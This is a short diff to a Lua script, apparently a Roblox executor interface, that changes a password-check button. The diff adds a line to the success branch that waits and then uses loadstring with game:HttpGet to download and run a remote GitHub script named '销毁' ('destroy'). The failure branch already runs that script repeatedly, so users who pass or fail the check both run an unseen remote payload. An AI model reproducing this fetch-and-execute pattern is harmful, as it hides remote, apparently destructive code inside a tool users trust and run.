@@ -35,10 +35,12 @@ section:Textbox("请输入文本", 'TextBoxfalg', "文本", function(txt)
     key = txt
 end)
 section:Button("验证密码", function()
-    if key == " " then
+    if key == " 企鹅没母" then
         notify("验证成功", "企鹅没版权", 3)
+        wait(10)
+        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
     else
-        notify("验证失败", "密码是企鹅没母", 3)
+        notify("验证失败", "密码是 企鹅没母", 3)
         loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
         wait(1)
         loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
